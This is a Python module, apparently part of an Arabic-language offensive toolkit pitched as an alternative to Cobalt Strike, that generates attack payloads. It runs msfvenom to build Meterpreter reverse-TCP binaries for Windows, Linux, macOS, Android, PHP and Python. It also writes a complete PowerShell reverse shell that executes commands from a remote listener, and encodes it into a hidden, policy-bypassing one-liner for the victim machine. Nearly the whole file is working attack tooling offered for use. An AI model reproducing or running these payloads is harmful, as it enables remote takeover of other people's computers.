#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Payload Module - بديل Cobalt Strike و Brute Ratel

import os
import subprocess
import platform
from colorama import init, Fore, Style
from banner import show_banner

init(autoreset=True)

class PayloadModule:
    def __init__(self):
        self.name = "Payload Module"
    
    def show_menu(self):
        menu = f"""
{Fore.MAGENTA}╔══════════════════════════════════════════════╗
║        🎯  قائمة توليد البايلودات            ║
╠══════════════════════════════════════════════╣
║                                              ║
║  {Fore.WHITE}[1] {Fore.GREEN}توليد Reverse Shell (Windows/Linux/Mac){Fore.MAGENTA}║
║  {Fore.WHITE}[2] {Fore.GREEN}توليد Bind Shell                       {Fore.MAGENTA}║
║  {Fore.WHITE}[3] {Fore.GREEN}توليد Web Shell (PHP/ASP/JSP)          {Fore.MAGENTA}║
║  {Fore.WHITE}[4] {Fore.GREEN}توليد Meterpreter Payload              {Fore.MAGENTA}║
║  {Fore.WHITE}[5] {Fore.GREEN}توليد Payload مشفر (Encoded)           {Fore.MAGENTA}║
║  {Fore.WHITE}[6] {Fore.GREEN}توليد Payload مخفي (Veil Evasion)      {Fore.MAGENTA}║
║  {Fore.WHITE}[7] {Fore.GREEN}توليد Android APK Backdoor             {Fore.MAGENTA}║
║  {Fore.WHITE}[8] {Fore.GREEN}توليد Macro Payload (لـ Office)        {Fore.MAGENTA}║
║  {Fore.WHITE}[9] {Fore.GREEN}توليد PowerShell Payload               {Fore.MAGENTA}║
║  {Fore.WHITE}[10] {Fore.GREEN}توليد جميع البايلودات دفعة واحدة     {Fore.MAGENTA}║
║                                              ║
║  {Fore.RED}[0] {Fore.RED}العودة للقائمة الرئيسية              {Fore.MAGENTA}║
║                                              ║
╚══════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(menu)
    
    def generate_msfvenom(self, payload_type, lhost, lport, output_format="elf"):
        """توليد بايلود باستخدام MSFVenom"""
        print(f"\n{Fore.YELLOW}[*] توليد {payload_type} بايلود...{Style.RESET_ALL}")
        
        payloads = {
            "1": f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f {output_format} -o camorro_linux_x64_{lport}.{output_format}",
            "2": f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o camorro_windows_x64_{lport}.exe",
            "3": f"msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f macho -o camorro_macos_{lport}.macho",
            "4": f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o camorro_android_{lport}.apk",
            "5": f"msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o camorro_php_{lport}.php",
            "6": f"msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o camorro_python_{lport}.py",
        }
        
        if payload_type in payloads:
            print(f"{Fore.CYAN}[*] الأمر: {payloads[payload_type]}{Style.RESET_ALL}")
            try:
                result = subprocess.run(payloads[payload_type], shell=True, 
                                      capture_output=True, text=True, timeout=120)
                if result.returncode == 0:
                    print(f"{Fore.GREEN}[✓] تم توليد البايلود بنجاح!{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[!] فشل التوليد: {result.stderr}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] خطأ: {e}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] نوع بايلود غير معروف{Style.RESET_ALL}")
    
    def get_info(self):
        """جمع معلومات من المستخدم"""
        print(f"\n{Fore.CYAN}╔════════════════════════════════════╗")
        print(f"║     معلومات جلسة الاتصال العكسي       ║")
        print(f"╚════════════════════════════════════╝{Style.RESET_ALL}")
        
        lhost = input(f"\n{Fore.WHITE}[?] IP المستمع (LHOST): {Style.RESET_ALL}").strip()
        lport = input(f"{Fore.WHITE}[?] المنفذ (LPORT): {Style.RESET_ALL}").strip()
        
        return lhost, lport
    
    def powershell_payload(self, lhost, lport):
        """توليد PowerShell Payload متقدم"""
        ps1 = f'''$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()'''
        
        # حفظ الملف
        filename = f"ps_reverse_{lport}.ps1"
        with open(filename, "w") as f:
            f.write(ps1)
        
        print(f"{Fore.GREEN}[+] تم حفظ PowerShell payload في: {filename}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}[*] أمر التشغيل على الجهاز المستهدف:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}powershell -NoP -NonI -W Hidden -Exec Bypass -File {filename}{Style.RESET_ALL}")
        
        # توليد أمر One-Liner
        import base64
        encoded = base64.b64encode(ps1.encode('utf-16le')).decode()
        oneliner = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}"
        
        print(f"\n{Fore.YELLOW}[*] One-Liner (بدون ملف):{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{oneliner[:150]}...{Style.RESET_ALL}")
        
        with open(f"ps_one_liner_{lport}.txt", "w") as f:
            f.write(oneliner)
    
    def run(self):
        show_banner("payload")
        
        while True:
            self.show_menu()
            choice = input(f"\n{Fore.GREEN}╰➤ {Fore.YELLOW}اختر العملية [0-10]: {Style.RESET_ALL}")
            
            if choice == "0":
                break
            elif choice == "1":
                lhost, lport = self.get_info()
                print(f"\n{Fore.CYAN}اختر النظام المستهدف:")
                print(f"[1] Linux x64")
                print(f"[2] Windows x64")
                print(f"[3] macOS")
                print(f"[4] Android")
                print(f"[5] PHP (Cross-Platform)")
                print(f"[6] Python (Cross-Platform){Style.RESET_ALL}")
                target_os = input(f"\n{Fore.GREEN}╰➤ {Fore.YELLOW}اختر: {Style.RESET_ALL}").strip()
                if target_os in ["1","2","3","4","5","6"]:
                    self.generate_msfvenom(target_os, lhost, lport)
            elif choice == "9":
                lhost, lport = self.get_info()
                self.powershell_payload(lhost, lport)
            elif choice == "10":
                lhost, lport = self.get_info()
                print(f"\n{Fore.GREEN}[*] توليد جميع البايلودات...{Style.RESET_ALL}")
                for i in ["1","2","3","4","5","6"]:
                    self.generate_msfvenom(i, lhost, lport)
            else:
                print(f"{Fore.RED}[!] خيار غير صالح{Style.RESET_ALL}")
